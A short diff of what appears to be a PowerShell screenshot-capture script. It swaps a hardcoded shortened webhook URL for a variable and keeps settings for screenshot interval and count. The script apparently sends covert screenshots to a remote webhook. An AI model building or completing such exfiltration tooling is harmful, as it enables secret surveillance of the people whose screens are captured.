@@ -1,4 +1,4 @@
-$hookurl = "https://is.gd/xSsigk"
+$hookurl = "$dc"
 $seconds = 30 # Screenshot interval
 $a = 1 # Sceenshot amount
 
